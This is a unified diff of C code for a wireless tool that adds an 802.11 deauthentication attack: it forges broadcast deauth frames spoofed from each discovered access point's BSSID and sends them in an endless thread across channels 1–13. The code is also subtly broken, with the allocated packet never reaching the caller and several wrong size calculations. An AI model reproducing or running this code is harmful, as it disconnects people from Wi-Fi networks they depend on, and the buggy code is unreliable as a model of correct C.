@@ -304,41 +304,61 @@ int iw_set_channel(struct iw_dev *dev, int chan)
 void channel_set(uint32_t *cs, uint8_t chan) { cs[chan/32] |= 1 << (chan % 32);}
 int channel_isset(uint32_t *cs, uint8_t chan) {return !!(cs[chan/32] & (1 << (chan % 32)));}
 
+void make_deauth_packet(void *pack, struct iw_dev *dev, struct access_point *ap)
+{
+	struct deauth_packet *packet;
+	uint16_t *reason;
+	pack = malloc(sizeof(packet)+sizeof(*reason));
+	memset(pack, 0 ,sizeof(packet) + sizeof(*reason));
+
+	packet = (struct deauth_packet*)pack;
+	packet->rt_hdr.len = sizeof(packet->rt_hdr) + sizeof(packet->w_rt_data);
+	packet->rt_hdr.present = RADIOTAP_F_PRESENT_RATE | RADIOTAP_F_PRESENT_TX_FLAGS;
+
+	packet->w_rt_data.rate = 2;
+	packet->w_rt_data.tx_flags = RADIOTAP_F_TX_FLAGS_NOACK | RADIOTAP_F_TX_FLAGS_NOSEQ;
+
+	packet->deauth.fc.subtype = FRAME_CONTROL_SUBTYPE_DEAUTH;
+	
+	memset(packet->deauth.dest_mac, '\xff', IFHWADDRLEN);
+	memcpy(packet->deauth.src_mac, ap->info.bssid, IFHWADDRLEN);
+	memcpy(packet->deauth.bssid, ap->info.bssid, IFHWADDRLEN);
+	reason = (uint16_t*)(packet->deauth.frame_body);
+
+	*reason = 7; 
+
+	packet->deauth.sc.sequence = ap->sequence++;
+}
+
 int send_deauth(struct iw_dev *dev, struct access_point *ap)
 {
-	struct mgmt_frame *deauth;
-	uint16_t *reason;
-	ssize_t r;
+	struct deauth_packet *deauth;
+	void *pack;
+	int r;
 
-	deauth = malloc(sizeof(*deauth) + sizeof(*reason));
-	if (deauth == NULL)
-	{
-		perror("malloc ");
-		return -1;
-	}
-
-	memset(deauth, 0, sizeof(deauth));
-	deauth->fc.subtype = FRAME_CONTROL_SUBTYPE_DEAUTH;
-	/* broadcast mac (ff:ff:ff:ff:ff:ff) */
-	memset(deauth->dest_mac, '\xff', IFHWADDRLEN);
-	memcpy(deauth->src_mac, ap->info.bssid, IFHWADDRLEN);
-	memcpy(deauth->bssid, ap->info.bssid, IFHWADDRLEN);
-	reason = (uint16_t*)&deauth->frame_body;
-	/* reason 7: Class 3 frame received from nonassociated STA */
-	*reason = 7;
+	make_deauth_packet(pack, dev, ap);
+	deauth = (struct deauth_packet *)pack;
 
 	/* send deauth */
-	deauth->sc.sequence = ap->sequence++;
+
 	ap->sequence %= 4096;
 	do {
-		r = iw_write(dev, deauth, sizeof(*deauth) + sizeof(*reason));
+		r = send(dev->fd_out, pack, sizeof(*pack), 0);
+		if(r < 0)
+		{
+			perror("send ");
+			free(pack);
+			return -1;
+		}
+		else if (r > 0)
+		{
+			r -= deauth->rt_hdr.len;
+			if (r <= 0)
+				r = 0;
+		}
 	} while (r == 0);
-	if (r < 0) {
-		free(deauth);
-		return r;
-	}
 
-	free(deauth);
+	free(pack);
 
 	return 0;
 }
@@ -350,9 +370,21 @@ void INThandler(int sig)
     g_wifi_end_signal = 1;
 }
 
-void *send_pack_thread(void *p)
+void *deauth_thread(void *arg)
 {
-
+	struct deauth_thread_args *ta = arg;
+	struct access_point *ap, *tmp;
+	
+	while (!g_wifi_end_signal)
+	{
+		ap = ta->apl->head;
+		while(ap != NULL && !g_wifi_end_signal)
+		{
+			send_deauth(ta->dev, ap);
+			ap = ap->next;
+		}
+	}
+	return NULL;
 }
 
 int main(int argc, char ** argv)
@@ -364,6 +396,9 @@ int main(int argc, char ** argv)
 	time_t tm, s_tm, e_tm;
 	uint32_t chans[8]={0,};
 	int n, ret, chan;
+	pthread_t thread_id;
+	struct deauth_thread_args ta;
+	pthread_mutex_t list_mutex;
 	
 	for (n = 1; n<=13; n++)
 		channel_set(chans,n);
@@ -400,15 +435,25 @@ int main(int argc, char ** argv)
 	memset(&api, 0, sizeof(api));
 	memset(&apl, 0, sizeof(apl));
 
+	ta.apl = &apl;
+	ta.dev = &dev;
+
+	pthread_mutex_init(&list_mutex, NULL);
+	ta.list_mutex = &list_mutex;
+
+	pthread_create(&thread_id, NULL, deauth_thread, &ta);
+
 	tm = time(NULL);
 
 	signal(SIGINT, INThandler);
 
-	while(1)
+	while(!g_wifi_end_signal)
 	{
 		if(get_ap_info(&dev, &api)==-1) continue;
 
+		pthread_mutex_lock(&list_mutex);
 		add_ap(&apl, &api);
+		pthread_mutex_unlock(&list_mutex);
 
 		n = 0;
 		if(time(NULL)-tm >= 1)
@@ -428,19 +473,9 @@ int main(int argc, char ** argv)
 				return -1;
 			}
 		}
-		if(g_wifi_end_signal)
-			break;
-	}
-    struct access_point *ap = apl.head;
-	int count = 0;
-	while(ap!=NULL)
-	{
-		printf("chan : %d, SSID : %s\n",ap->info.chan, ap->info.essid);
-		ap = ap->next;
-		count++;
 	}
 
-	printf("\n\"%d\" wifi founds\n",count);
+	pthread_join(thread_id, NULL);
 	iw_dev_unset(&dev);
 	free_ap_list(&apl);
 
